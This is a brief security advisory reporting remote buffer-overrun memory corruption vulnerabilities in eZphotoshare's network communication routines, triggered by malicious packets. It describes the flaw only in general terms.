eZphotoshare has been reported prone to multiple remote memory corruption vulnerabilities. The issues present themselves in the routines employed by eZphotoshare to handle network based communications. It has been reported that a remote attacker may overrun the bounds of a reserved buffer in eZphotoshare process memory by transmitting a number of malicious packets to the host that is running eZphotoshare.

This activity will ultimately result in the corruption of variables that are saved adjacent to the affected buffer. These variables are crucial to the operation of the vulnerable software.
